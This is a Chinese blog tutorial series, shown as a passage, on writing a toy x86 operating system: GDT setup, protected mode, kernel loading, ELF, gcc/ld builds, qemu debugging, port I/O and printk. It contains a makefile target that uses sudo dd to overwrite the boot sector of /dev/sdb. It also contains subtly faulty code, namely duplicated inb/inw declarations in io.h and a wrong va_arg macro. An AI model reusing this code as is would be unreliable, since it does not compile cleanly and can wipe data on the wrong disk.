(1024 * 1024 * 1024 *4) / (1024*4) - 1; 内存界限 4G/4K -1;;;;;;;;;;;;gdt[2]gdt_ptr: dw (gdt_end-gdt_base)-1 dd gdt_basegdt_base: dd 0,0 ;null描述符gdt_code: dw memeory_limit &amp; 0xffff ; 段界限 0-15 dw memeory_base &amp; 0xffff ; 基地址 0-16 db memeory_base&gt;&gt;16 &amp; 0xff ; 基地址 0-16 db 0b_1_00_1_1_0_1_0 ; 存在-dlp_0-S_代码-非依从-可读-没有被访问过 ; 4k-32位-不是64位-avaliable_0-段界限16~19 db 0b_1_1_0_0_0000 | (memeory_limit &gt;&gt; 16) &amp;0xf db (memeory_base &gt;&gt; 24) &amp; 0xffgdt_data: dw memeory_limit &amp; 0xffff ; 段界限 0-15 dw memeory_base &amp; 0xffff ; 基地址 0-16 db memeory_base&gt;&gt;16 &amp; 0xff ; 基地址 0-16 ; 存在-dlp_0-S_数据-非依从向上-可读-没有被访问过 db 0b_1_00_1_0_0_1_0 ; 4k-32位-不是64位-avaliable_0-段界限16~19 db 0b_1_1_0_0_0000 | (memeory_limit &gt;&gt; 16) &amp;0xf db (memeory_base &gt;&gt; 24) &amp; 0xff gdt_end: 准备保护模式 12345678910111213141516171819prepare_protected_mode: xchg bx,bx cli;关闭中断 ; 打开A20线 in al, 0x92 or al, 0b10 out 0x92, al ;加载GDT lgdt [gdt_ptr] ;启动保护模式 mov eax, cr0 or eax, 1 mov cr0, eax ;用跳转刷新缓存，启用保护模式 jmp dword code_selector:protected_mode 进入保护模式 123456789101112131415protected_mode: xchg bx, bx mov ax, data_selector ;初始化段寄存器 mov ds, ax mov es, ax mov fs, ax mov gs, ax mov ss, ax mov esp, 0x10000; 栈顶 mov byte [0xb8000], &#x27;P&#x27; mov byte [0x200000], &#x27;P&#x27;jmp $ 参考 https://www.bilibili.com/video/BV1bT4y1k7EQ 内核第二讲,内存保护的实现,以及知识简介,局部描述符,全局描述符. 操作系统实现-进入内核 在上一篇文章中我们实现了进入保护模式，那么下一步就是进入操作系统内核 这个时候我们就可以直接给寄存器赋值，能使用更大的内存地址空间 文件整理 首先对整个文件夹目录结构如下 123456789101112131415161718192021joe1sn@ubuntu:~/Desktop/os2$ tree.├── build│ ├── boot│ │ ├── boot.bin│ │ └── loader.bin│ ├── kernel│ │ └── start.o│ ├── kernel.bin│ ├── master.img│ ├── system.bin│ └── system.map└── src ├── bochsrc ├── boot │ ├── boot.asm │ └── loader.asm ├── build ├── kernel │ └── start.asm └── makefile build 所有最终生成的文件都会放在这里 boot：MBR以及boot相关二进制文件 kernel：操作系统启动的相关二进制文件 src 源代码 bochsrc：bochs配置文件 boot：MBR以及boot相关源代码 kenel：操作系统源代码 makefile：项目编译文件 对应修改的makefile 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152BUILD:=../buildSRC:=.ENTRYPOINT:=0x10000$(BUILD)/boot/%.bin: $(SRC)/boot/%.asm $(shell mkdir -p $(dir $@)) nasm -f bin $&lt; -o $@$(BUILD)/kernel/%.o: $(SRC)/kernel/%.asm $(shell mkdir -p $(dir $@)) nasm -f elf32 $&lt; -o $@$(BUILD)/kernel.bin: $(BUILD)/kernel/start.o $(shell mkdir -p $(dir $@)) ld -m elf_i386 -static $^ -o $@ -Ttext $(ENTRYPOINT)$(BUILD)/system.bin: $(BUILD)/kernel.bin objcopy -O binary $&lt; $@$(BUILD)/system.map: $(BUILD)/kernel.bin nm $&lt; | sort &gt; $@$(BUILD)/master.img: $(BUILD)/boot/boot.bin \\ $(BUILD)/boot/loader.bin \\ $(BUILD)/system.bin \\ $(BUILD)/system.map \\ yes | bximage -hd -mode=&quot;flat&quot; -size=60 -q $(BUILD)/master.img dd if=$(BUILD)/boot/boot.bin of=$@ bs=512 count=1 conv=notrunc dd if=$(BUILD)/boot/loader.bin of=$@ bs=512 count=4 seek=2 conv=notrunc dd if=$(BUILD)/system.bin of=$@ bs=512 count=200 seek=10 conv=notrunc.PHONY: cleanclean: rm -rf $(BUILD)/*.PHONY: usbusb: $(BUILD)/boot/boot.bin /dev/sdb sudo dd if=/dev/sdb of=tmp.bin bs=512 count=1 conv=notrunc cp tmp.bin usb.bin sudo rm tmp.bin dd if=$(BUILD)/boot/boot.bin of=usb.bin bs=446 count=1 conv=notrunc sudo dd if=usb.bin of=/dev/sdb bs=512 count=1 conv=notrunc rm usb.bintest: $(BUILD)/master.img.PHONY: bochsbochs: $(BUILD)/master.img bochs -q 在bochsrc配置里面注意更改硬盘的path配置为 …/build/master.img 测试 src/kernel/start.asm 12345[bits 32]global _start_start: mov byte [0xb8000], &#x27;k&#x27;; 表示进入了内核 src/boot/loader.asm 在protect_mode里面添加，调整栈帧后，使用代码选择子跳转到0x10000内存执行start.asm 1234567mov esp, 0x10000; 栈顶mov edi, 0x10000 ; 读到的目标内存mov ecx, 10 ; 起始扇区mov bl,200 ;扇区数量call read_disk; xchg bx, bxjmp dword code_selector:0x10000 在目标内存地址(0x10000)找到kernel.bin的二进制代码 操作系统实现-ELF文件格式 这个对CTFpwner来说比较简单 ELF的三种格式 可重定位文件（Relocatable file） 包含了代码和数据，可以和其他目标文件链接生成一个可执行文件或共享 目标文件。 可执行文件（Executable File） 包含了可以直接执行的文件。 共享目标文件（Shared Object File） 包含了用于链接的代码和数据，分两种情况。一种是链接器将其与其他的 可重定位文件和共享目标文件链接起来，生产新的目标文件。另一种是动 态链接器将多个共享目标文件与可执行文件结合，作为进程映像的一部 分 内核的文件格式：可执行程序 代码段 .text section(ELF文件段)| segment CPU 数据 .data section：已经初始化过后的数据 .bss(Block Started by Symbol)：未初始化过的数据 程序分析 12345#include &lt;stdio.h&gt; int main()&#123; printf(&quot;hello world\\n&quot;); return 0;&#125; 编译 1gcc -m32 hello.c -o hello 使用readelf objdump IDA_PRO等查看 1readelf -e hello 相关资料 CTF-WIKI ELF 文件 操作系统实现-编译链接与数据类型 编译链接 当GCC编译程序的时候会经历上述几步： 我们在项目 新建src/kernel/include/xsys 在里面新建include/xsys/xsys.h 12345678#ifndef XSYS_H#define XSYS_H#define XSYS_MAGIC 20220227void kernel_init(); //初始化内核#endif 创建src/kernel/main.c 123456789101112131415#include &lt;xsys/xsys.h&gt;int magic = XSYS_MAGIC; char message[]=&quot;hello Xsys&quot;; //.datachar buf[1024]; //.bssvoid kernel_init()&#123; char *video = (char *) 0xb8000; //文本显示器内存位置 for (int i = 0; i &lt; sizeof(message); i++) &#123; video[i*2]=message[i]; &#125;&#125; 预处理 1gcc -m32 -E main.c -I ../include/ &gt; test.c 这样就生成了main.c的与处理文件 12345678910111213141516171819202122232425# 1 &quot;main.c&quot;# 1 &quot;&lt;built-in&gt;&quot;# 1 &quot;&lt;command-line&gt;&quot;# 31 &quot;&lt;command-line&gt;&quot;# 1 &quot;/usr/include/stdc-predef.h&quot; 1 3 4# 32 &quot;&lt;command-line&gt;&quot; 2# 1 &quot;main.c&quot;# 1 &quot;../include/xsys/xsys.h&quot; 1void kernel_init();# 2 &quot;main.c&quot; 2int magic = 20220227;char message[]=&quot;hello Xsys&quot;;char buf[1024];void kernel_init()&#123; char *video = (char *) 0xb8000; for (int i = 0; i &lt; sizeof(message); i++) &#123; video[i*2]=message[i]; &#125;&#125; 汇编 1gcc -m32 -S test.c &gt; test.s 得到C转汇编的源代码文件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475 .file &quot;test.c&quot; .text .globl magic .data .align 4 .type magic, @object .size magic, 4magic: .long 20220227 .globl message .align 4 .type message, @object .size message, 11message: .string &quot;hello Xsys&quot; .comm buf,1024,32 .text .globl kernel_init .type kernel_init, @functionkernel_init:.LFB0: .cfi_startproc pushl %ebp .cfi_def_cfa_offset 8 .cfi_offset 5, -8 movl %esp, %ebp .cfi_def_cfa_register 5 pushl %ebx subl $16, %esp .cfi_offset 3, -12 call __x86.get_pc_thunk.ax addl $_GLOBAL_OFFSET_TABLE_, %eax movl $753664, -8(%ebp) movl $0, -12(%ebp) jmp .L2.L3: movl -12(%ebp), %edx addl %edx, %edx movl %edx, %ecx movl -8(%ebp), %edx addl %edx, %ecx leal message@GOTOFF(%eax), %ebx movl -12(%ebp), %edx addl %ebx, %edx movzbl (%edx), %edx movb %dl, (%ecx) addl $1, -12(%ebp).L2: movl -12(%ebp), %edx cmpl $10, %edx jbe .L3 nop addl $16, %esp popl %ebx .cfi_restore 3 popl %ebp .cfi_restore 5 .cfi_def_cfa 4, 4 ret .cfi_endproc.LFE0: .size kernel_init, .-kernel_init .section .text.__x86.get_pc_thunk.ax,&quot;axG&quot;,@progbits,__x86.get_pc_thunk.ax,comdat .globl __x86.get_pc_thunk.ax .hidden __x86.get_pc_thunk.ax .type __x86.get_pc_thunk.ax, @function__x86.get_pc_thunk.ax:.LFB1: .cfi_startproc movl (%esp), %eax ret .cfi_endproc.LFE1: .ident &quot;GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0&quot; .section .note.GNU-stack,&quot;&quot;,@progbits 编译 1as -32 test.s -o test.o 将test.s编译位32位的ELF文件test.o 这个时候使用readelf查看文件结构 1readelf -a test.o 会看到这些段都是没有地址的，当我们链接才能找到准确的地址 同时我们的变量也加入到了符号表中 链接 1ld -m elf_i386 -static test.o -o test.out -e kernel_init 将test.o文件按照elf i386的格式链接到库文件，同时声明外部函数kernel_init 这个时候已经有了Addr了，但是启动还是会出错，因为我们之前定义的是在0x10000出启动程序 gcc直接编译 1gcc -m32 main.c -I ../include/ -o main.out -e kernel_init -nostartfiles -nostartfiles：类似与windows里面的入口点不使用main 写入到操作系统 添加一个kernel/%.c编译到kernel/%.o的makefile 123$(BUILD)/kernel/%.o: $(SRC)/kernel/%.c $(shell mkdir -p $(dir $@)) gcc $(CFLAGS) $(DEBUG) $(INCLUDE) -c $&lt; -o $@ 同时可以加还是那个编译参数 123DEBUG:= -gCFLAGS:= -m32INCLUDE:= -I$(SRC)/include 完整的makefile如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455BUILD:=../buildSRC:=.ENTRYPOINT:=0x10000CFLAGS:= -m32DEBUG:= -gINCLUDE:= -I$(SRC)/include$(BUILD)/boot/%.bin: $(SRC)/boot/%.asm $(shell mkdir -p $(dir $@)) nasm -f bin $&lt; -o $@$(BUILD)/kernel/%.o: $(SRC)/kernel/%.asm $(shell mkdir -p $(dir $@)) nasm -f elf32 $(DEBUG) $&lt; -o $@$(BUILD)/kernel/%.o: $(SRC)/kernel/%.c $(shell mkdir -p $(dir $@)) gcc $(CFLAGS) $(DEBUG) $(INCLUDE) -c $&lt; -o $@ $(BUILD)/kernel.bin: $(BUILD)/kernel/start.o \\ $(BUILD)/kernel/main.o $(shell mkdir -p $(dir $@)) ld -m elf_i386 -static $^ -o $@ -Ttext $(ENTRYPOINT)#objcpoy加载bss段展开文件$(BUILD)/system.bin: $(BUILD)/kernel.bin objcopy -O binary $&lt; $@$(BUILD)/system.map: $(BUILD)/kernel.bin nm $&lt; | sort &gt; $@$(BUILD)/master.img: $(BUILD)/boot/boot.bin \\ $(BUILD)/boot/loader.bin \\ $(BUILD)/system.bin \\ $(BUILD)/system.map \\ yes | bximage -hd -mode=&quot;flat&quot; -size=60 -q $(BUILD)/master.img dd if=$(BUILD)/boot/boot.bin of=$@ bs=512 count=1 conv=notrunc dd if=$(BUILD)/boot/loader.bin of=$@ bs=512 count=4 seek=2 conv=notrunc dd if=$(BUILD)/system.bin of=$@ bs=512 count=200 seek=10 conv=notrunc.PHONY: cleanclean: rm -rf $(BUILD)/*test: $(BUILD)/master.img.PHONY: bochsbochs: $(BUILD)/master.img bochs -q 再修改下kernel/start.asm 123456789101112[bits 32]extern kernel_initglobal _start_start: ; mov byte [0xb8000], &#x27;k&#x27;; 表示进入了内核 xchg bx, bx call kernel_init xchg bx, bx jmp $ make test一下没问题后make clean再make bochs调试 进入kernel_init 显示输出被覆盖，说明调用成功 数据类型 在操作系统中，数据类型都是被定义好的 新建include/xsys/types.h 1234567891011121314151617181920212223242526#ifndef XSYS_TYPES_H#define XSYS_TYPES_H#define EOF -1 //end of file#define NULL 0 //空指针#define bool _Bool#define true 1#define false 0//#define _packed __attribute__((packed))typedef unsigned int size_t;typedef char int8;typedef short int16;typedef int int32;typedef long int64;typedef unsigned char u8;typedef unsigned short u16;typedef unsigned int u32;typedef unsigned long u64;#endif 新建test/test.c 1234567891011121314151617181920212223242526272829303132#include &lt;xsys/types.h&gt;#include &lt;stdio.h&gt;typedef struct descriptor&#123; unsigned short limit_low; unsigned int base_low : 24; unsigned char type : 4; unsigned char segment : 1; unsigned char DPL : 2; unsigned char present : 1; unsigned char limit_high :4; unsigned char avaliable : 1; unsigned char long_mode : 1; unsigned char big : 1; unsigned char granulartity : 1; unsigned char base_high;&#125; __attribute__((packed)) descriptor;// &#125;descriptor;int main()&#123; printf(&quot;size of u8 %d\\n&quot;, sizeof(u8)); printf(&quot;size of u16 %d\\n&quot;, sizeof(u16)); printf(&quot;size of u32 %d\\n&quot;, sizeof(u32)); printf(&quot;size of u64 %d\\n&quot;, sizeof(u64)); printf(&quot;size of descriptor %d\\n&quot;, sizeof(descriptor)); descriptor des; return 0;&#125; __attribute__用于不对齐变量来构造特殊结构体，使用vscode自带的调试可以看出 操作系统实现-qemu调试与vmdk qemu调试 其实你也可以用bochs-gdb，但是我觉得bochs-gdb要重新配置一些文件很麻烦，还是vm+vscode调试方便些，所以这里需要用到qemu 安装qemu 12sudo apt-get install qemusudo apt-get install qemu-extract 在qemu中启动系统 src/makefile中，添加 123456.PHONY: qemuqemu: $(BUILD)/master.img qemu-system-i386 \\ -m 32M \\ -boot c \\ -hda $&lt; 使用i386构架的CPU，内存位32MB，存储是硬盘(boot -c)，选择的硬盘文件是$(BUILD)/master.img 使用qemu调试 src/makefile中，添加 1234567.PHONY: qemugqemug: $(BUILD)/master.img qemu-system-i386 \\ -s -S \\ -m 32M \\ -boot c \\ -hda $&lt; 这里-s -S是调试，远程调试，远程调试端口是1234 为了测试，使用vscode在src/kernel/main.c中下个断点 在vm中启用qemu调试，qemu等待debugger启动调试 之后可以在vscode中直接使用F5调试，但是launch.json中的program要改为**${workspaceFolder}/build/kernel.bin** F5开始调试 接着继续 vmdk 使用qemu的一些功能可以把我们的master.img转换成master.vmdk从而在vmware上运行 在src/makefile中新增 12345$(BUILD)/master.vmdk: $(BUILD)/master.img qemu-img convert -O vmdk $&lt; $@.PHONY: vmdkvmdk: $(BUILD)/master.vmdk 得到vmdk文件过后直接创建虚拟机就行了 在创建虚拟机是要注意： Linux版本最好&gt;=4，不然\\xaa\\x55校验过不了 虚拟磁盘类型选择IDE 使用现有虚拟磁盘，选择刚才生成的vmdk文件就行 操作系统实现-gcc与汇编 在之前的test文件中新建一个hello.c和src/test/makefile hello.c 12345678910#include &lt;stdio.h&gt;char message[] = &quot;hello world\\n&quot;;char buf[1024];int main()&#123; printf(&quot;%s\\n&quot;,message); return 0;&#125; makefile 12345678910111213CFLAGS:= -m32# CFLAGS+= -fno-builtin #不需要gcc内置函数# CFLAGS+= -nostdinc #不用标准头文件# CFLAGS+= -nostdlib #不需要标准库# CFLAGS+= -fno-pic #不需要位置无关代码# CFLAGS+= -fno-pie #关闭PIE保护# CFLAGS+= -fno-stack-protector #不需要栈保护CFLAGS:=$(strip $&#123;CFLAGS&#125;).PHONY: hello.shello.s: hello.c gcc $(CFLAGS) -S $&lt; -o $@ 在生成了.s汇编文件中，会发现有**.cfi**开始投的段 .cfi：Call Frame Information（调用栈帧信息） 一种DWARF信息，用于调试，获得调用异常 -fno-asynchronous-unwind-tables，不需要cfi信息 call __x86.get_pc_thunk.ax：生成PIC的辅助函数，获取调用时EIP的值，功能上相当于mov eax, eip，接着得到 _GLOBAL_OFFSET_TABLE_ PIC：postion independent code（位置无关代码） -fno-pic，不需要位置无关代码 ** _GLOBAL_OFFSET_TABLE_ **：里面存储了符号地址信息 .ident &quot;GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0： .ident：GCC的版本信息 -Qn：去掉GCC版本信息 andl $-16, %esp：栈对齐 −16=0−16=0−10H=fffffff0H-16 = 0 - 16 = 0-10H = fffffff0H−16=0−16=0−10H=fffffff0H 与操作过后就有只剩最后四位，这样就将栈16字节对齐 字节对齐访问内存更加高效（使用更少的时钟周期） 数据访问的过程： 待读数据的内存地址放入地址总线 修改READ标志启用断言，及没有正确就会出发halt暂停 等待内存控制器响应 把数据从数据总线复制到目标地址 由上：若不对齐访问的话，会多传几次地址才能得到需要的值，从而造成更多的时钟周期浪费 -mpreferred-stack-boundary=2：取消栈对齐 栈帧 123456pushl %ebpmovl %esp, %ebp...leave ;等效于 ;mov %ebp, %esp ;pop %ebp -fomit-frame-pointer：去掉栈帧 最后剩下的 123456789101112131415161718192021 .file &quot;hello.c&quot; ;文件名 .text ;代码段 .globl message ;将message导出 .data ;数据段 .align 4 ;按4字节对齐 .type message, @object;类型 .size message, 13 ;尺寸message: .string &quot;hello world\\n&quot; .comm buf,1024,32 .text ;代码段 .globl main ;main函数 .type main, @functionmain: pushl $message ;&amp;message压入栈中 call puts addl $4, %esp ;恢复栈 movl $0, %eax ;函数返回值，存储在eax中 ret ;函数调用返回 .size main, .-main ;main函数尺寸 .section .note.GNU-stack,&quot;&quot;,@progbits ;标及栈不可运行，NX保护 vscode中调试汇编 在设置里面搜索break，打开允许所有文件断点 在task.json中 “type”: “shell” ![](https://img.joe1sn.top/uploads/big/dbc59407db30d4cf22704e34ea41cfc3.png 操作系统实现-堆栈/函数/变量/传参 堆栈和函数 其实之前CTF里面的文章讲过一些了 https://blog.joe1sn.top/2021/01/16/heap_learning_part0-堆基础/ 栈：是一个很重要的数据结构，特征：后进先出 堆栈是一块内存区域 栈顶指针是在ss:esp寄存器中，栈底在高地址，向下增长 创建src/test/call.asm 12345678[bits 32]extern exitglobal mainmain: push 0 ;传递参数 call exit 在src/.vscode/launch.json添加调试参数使用NASM汇编格式 123456789101112131415161718192021222324252627&#123; &quot;name&quot;: &quot;NASM Build Debugger&quot;, &quot;type&quot;: &quot;cppdbg&quot;, &quot;request&quot;: &quot;launch&quot;, // &quot;program&quot;: &quot;$&#123;workspaceFolder&#125;/build/kernel.bin&quot;, &quot;program&quot;: &quot;$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;.out&quot;, &quot;args&quot;: [], &quot;stopAtEntry&quot;: false, &quot;cwd&quot;: &quot;$&#123;fileDirname&#125;&quot;, &quot;environment&quot;: [], &quot;externalConsole&quot;: false, &quot;MIMode&quot;: &quot;gdb&quot;, &quot;setupCommands&quot;: [ &#123; &quot;description&quot;: &quot;为 gdb 启用整齐打印&quot;, &quot;text&quot;: &quot;-enable-pretty-printing&quot;, &quot;ignoreFailures&quot;: true &#125;, &#123; &quot;description&quot;: &quot;将反汇编风格设置为 Intel&quot;, &quot;text&quot;: &quot;-gdb-set disassembly-flavor intel&quot;, &quot;ignoreFailures&quot;: true &#125; ], &quot;preLaunchTask&quot;: &quot;NASM Build Debugger&quot;, &quot;miDebuggerPath&quot;: &quot;/usr/bin/gdb&quot;&#125; 修改./.vscode/task.json添加如下配置 1234567891011121314151617181920212223242526272829303132333435&#123; &quot;type&quot;: &quot;shell&quot;, &quot;label&quot;: &quot;NASM Build Debugger&quot;, &quot;command&quot;: &quot;&quot;, &quot;args&quot;: [ &quot;/usr/bin/nasm&quot;, &quot;-f&quot;, &quot;elf32&quot;, &quot;-g&quot;, &quot;$&#123;file&#125;&quot;, &quot;-o&quot;, &quot;$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;.o&quot;, &quot;;&quot;, &quot;/usr/bin/gcc&quot;, &quot;-fdiagnostics-color=always&quot;, &quot;-m32&quot;, //32 位程序 &quot;-g&quot;, &quot;-static&quot;, &quot;-I$&#123;workspaceFolder&#125;/src/include&quot;, &quot;$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;.o&quot;, &quot;-o&quot;, &quot;$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;.out&quot; ], &quot;options&quot;: &#123; &quot;cwd&quot;: &quot;$&#123;fileDirname&#125;&quot; &#125;, &quot;problemMatcher&quot;: [ &quot;$gcc&quot; ], &quot;group&quot;: &#123; &quot;kind&quot;: &quot;build&quot;, &quot;isDefault&quot;: true &#125;, &quot;detail&quot;: &quot;调试器生成的任务。&quot; &#125; 32位汇编到object再用gcc到elf.out，调试表丢失 我用同样的方法试了一个32位的helloworld，也是无法调试，objdump看有file line addr信息，gdb也是which has no line number infomation，然后vscode调试的时候多下几个断点才能起到效果.很烦人 所以这里我直接猛下断点 经过编译与链接，最终的elf文件如下 在调试控制台使用如下命令查看栈信息 1-exec display/8xw $sp （图片被处理过）可以看到栈的生长方向，还有相关的一些值 push：入栈 pop：出栈 pusha：压入8个寄存器 popa：弹出7个寄存器，忽略esp 函数 call：函数返回的下一条指令的返回地址压入栈 ret：栈顶弹出到EIP call与ret无关 变量与传参 新建src/test/param.c 12345678910111213int add(int x,int y)&#123; int z = x + y; return z;&#125;int main()&#123; int a = 5; int b = 3; int c = add(a,b); return 0;&#125; 写makefile 123.PHONY: param.sparam.s: param.c gcc $(CFLAGS) -S $&lt; -o $@ 最后生成的src/test/param.asm 123456789101112131415161718192021222324252627282930313233343536373839 .file &quot;param.c&quot; .text .globl add .type add, @functionadd: pushl %ebp movl %esp, %ebp subl $4, %esp ;一个局部变量 movl 8(%ebp), %edx ;a movl 12(%ebp), %eax ;b addl %edx, %eax ;相加，eax+=edx movl %eax, -4(%ebp) ;z = x + y movl -4(%ebp), %eax ;eax = z leave ret .size add, .-add .globl main .type main, @functionmain: pushl %ebp movl %esp, %ebp ;保存栈帧 subl $12, %esp ;保存12字节，及3个局部变量 movl $5, -12(%ebp);a movl $3, -8(%ebp);b ;-----------------------------32位传参准备 pushl -8(%ebp) ;b pushl -12(%ebp) ;a call add addl $8, %esp ;esp恢复 movl %eax, -4(%ebp);c=add(a,b) movl $0, %eax ;返回值存储在eax中(return 0) leave ;回复栈帧 ret .size main, .-main .section .note.GNU-stack,&quot;&quot;,@progbits 64位：寄存器传参 32位：栈传参 取消栈帧 123456789101112131415161718192021222324252627282930 .file &quot;param.c&quot; .text .globl add .type add, @functionadd: subl $4, %esp movl 8(%esp), %edx movl 12(%esp), %eax addl %edx, %eax movl %eax, (%esp) movl (%esp), %eax addl $4, %esp ret .size add, .-add .globl main .type main, @functionmain: subl $12, %esp movl $5, (%esp) movl $3, 4(%esp) pushl 4(%esp) pushl 4(%esp) call add addl $8, %esp movl %eax, 8(%esp) movl $0, %eax addl $12, %esp ret .size main, .-main .section .note.GNU-stack,&quot;&quot;,@progbits 堆：https://blog.joe1sn.top/2021/01/16/heap_learning_part0-堆基础/ 操作系统实现-IO与字符串处理 代码来源：https://github.com/StevenBaby/onix 相关课程：https://www.bilibili.com/video/BV1gR4y1u7or 感谢B站UP：踌躇月光 带来的相关代码和教程 Input/Output 参考之前的硬盘读写，那么我们需要对一些端口进行操作 CRT：阴极射线管 地址寄存器：0x3D4 数据寄存器：0x3D5 光标位置：高位0xE 光标位置：高位0xF src/include/xsys/io.h 123456789101112#ifndef XSYS_IO_H#define XSYS_IO_H#include &lt;xsys/types.h&gt;extern u8 inb(u16 port); //输入一个字节extern u16 inw(u16 port); //输入一个字extern void inb(u16 port, u8 value); //输出一个字节extern void inw(u16 port, u16 value); //输出一个字#endif src/kernel/io.asm 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566[bits 32]section .text; 代码段global inb ; 将 inb 导出inb: push ebp; mov ebp, esp ; 保存帧 xor eax, eax ; 将 eax 清空 mov edx, [ebp + 8]; port in al, dx; 将端口号 dx 的 8 bit 输入到 al jmp $+2 ; 一点点延迟 jmp $+2 ; 一点点延迟 jmp $+2 ; 一点点延迟 leave ; 恢复栈帧 retglobal outboutb: push ebp; mov ebp, esp ; 保存帧 mov edx, [ebp + 8]; port mov eax, [ebp + 12]; value out dx, al; 将 al 中的 8 bit 输入出到 端口号 dx jmp $+2 ; 一点点延迟 jmp $+2 ; 一点点延迟 jmp $+2 ; 一点点延迟 leave ; 恢复栈帧 retglobal inwinw: push ebp; mov ebp, esp ; 保存帧 xor eax, eax ; 将 eax 清空 mov edx, [ebp + 8]; port in ax, dx; 将端口号 dx 的 16 bit 输入到 ax jmp $+2 ; 一点点延迟 jmp $+2 ; 一点点延迟 jmp $+2 ; 一点点延迟 leave ; 恢复栈帧 retglobal outwoutw: push ebp ; mov ebp, esp ; 保存帧 mov edx, [ebp + 8]; port mov eax, [ebp + 12]; value out dx, ax; 将 ax 中的 16 bit 输入出到 端口号 dx jmp $+2 ; 一点点延迟 jmp $+2 ; 一点点延迟 jmp $+2 ; 一点点延迟 leave ; 恢复栈帧 ret src/kernel/main.c 1234567891011121314151617181920212223242526#include &lt;xsys/xsys.h&gt;#include &lt;xsys/types.h&gt;#include &lt;xsys/io.h&gt;#define CRT_ADDR_REG 0x3d4#define CRT_DATA_REG 0x3d5#define CRT_CURSOR_H 0xeu#define CRT_CURSOR_L 0xfvoid kernel_init()&#123; //获得当前光标坐标 outb(CRT_ADDR_REG,CRT_CURSOR_H); //将高位导出到地址端口 u16 pos = inb(CRT_DATA_REG) &lt;&lt; 8; //移到pos高位 outb(CRT_ADDR_REG,CRT_CURSOR_L); //将低位导出到地址端口 pos |= inb(CRT_DATA_REG); //移到pos低位 //修改当前光标坐标 outb(CRT_ADDR_REG,CRT_CURSOR_H); outb(CRT_DATA_REG,0); outb(CRT_ADDR_REG,CRT_CURSOR_L); outb(CRT_DATA_REG,1); return;&#125; src/makefile 添加io.o依赖 1234567$(BUILD)/kernel.bin: \\ $(BUILD)/kernel/start.o \\ $(BUILD)/kernel/main.o \\ $(BUILD)/kernel/io.o $(shell mkdir -p $(dir $@)) ld -g -m elf_i386 -static $^ -o $@ -Ttext $(ENTRYPOINT) 关于调试 我在网上找了一圈，实在是没有找到像视频中的效果，所以建议使用gdb调试汇编相关 首先调试获得光标，这里基本要观察的变量在C语言中，可以试着使用vscode远程调试 ​ 最后的得到值是：240，bin(240)=11110000bin(240)=11110000bin(240)=11110000，所以高位是1111，地位是0000 240=3∗80240=3*80240=3∗80，刚好也是第四行第一个 接着修改光标位置 其实我们可以算出坐标的值：000000001，我们可以验证下 字符串处理 有 #include &lt;string.h&gt; 同时可以使用汇编或等更高效的实现 参考 https://www.bilibili.com/video/BV1zL4y1s76t/?spm_id_from=333.788 https://www.osdever.net/FreeVGA/home.htm http://www.osdever.net/FreeVGA/vga/crtcreg.htm 操作系统实现-多参数与printk实现 printf的多参数原理 printk这个函数实在操作系统内核里面实现的，一般在用户态中是printf，两者原理上差不多 首先看printf的多参数实现 在Linux源代码中，printf是这样写的 /arch/x86/boot/printf.c 1234567891011121314int printf(const char *fmt, ...)&#123; char printf_buf[1024]; va_list args; int printed; va_start(args, fmt); printed = vsprintf(printf_buf, fmt, args); va_end(args); puts(printf_buf); return printed;&#125; 其中的变量类型 va_list、va_start、va_end定义如下 /include/linux/stdarg.h 1234567891011#ifndef _LINUX_STDARG_H#define _LINUX_STDARG_Htypedef __builtin_va_list va_list;#define va_start(v, l) __builtin_va_start(v, l)#define va_end(v) __builtin_va_end(v)#define va_arg(v, T) __builtin_va_arg(v, T)#define va_copy(d, s) __builtin_va_copy(d, s)#endif gcc/x86_64-linux-gnu/7/include/stdarg.h中，有 1234#ifndef __GNUC_VA_LIST#define __GNUC_VA_LISTtypedef __builtin_va_list __gnuc_va_list;#endif 通过查阅gcc的源代码你会发现最原始的功能实现被改进了很多，其实可以翻译为 12345678910#ifndef XSYS_STDARG_H#define XSYS_STDARG_Htypedef char* va_list;#define va_start(ap, v) (ap = (va_list)&amp;v + sizeof(char*) )#define va_arg(ap, t) (* (t*)(ap+=sizeof(char*)-sizeof(char*)) )#define va_end(ap) (ap = (va_list)0)#endif va_start(ap, v)：ap为 v（一个va_list）的开始格式化字符串 va_arg(ap, t)：t为当前格式化字符串，ap为下一个格式化字符串 注：ap+=sizeof(char*)-sizeof(char*)这时已经ap=ap+sizeof(char *)了 va_end(ap)：让格式化字符串置零 则我们可以有printk实现 printk实现 src/kernel/printk.c 12345678910111213141516171819#include &lt;xsys/stdarg.h&gt;#include &lt;xsys/stdio.h&gt;#include &lt;xsys/console.h&gt;static char buf[1024];int printk(const char *fmt, ...)&#123; va_list args; int i; va_start(args, fmt); i = vsprintf(buf, fmt, args); va_end(args); console_write(buf, i); return i;&#125; src/lib/vsprintf.c 这里可以取巧抄linux的源代码：https://elixir.bootlin.com/linux/latest/source/arch/x86/boot/printf.c#L113 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381#include &lt;xsys/stdarg.h&gt;#include &lt;xsys/string.h&gt;#define ZEROPAD 1 // 填充零#define SIGN 2 // unsigned/signed long#define PLUS 4 // 显示加#define SPACE 8 // 如是加，则置空格#define LEFT 16 // 左调整#define SPECIAL 32 // 0x#define SMALL 64 // 使用小写字母#define is_digit(c) ((c) &gt;= &#x27;0&#x27; &amp;&amp; (c) 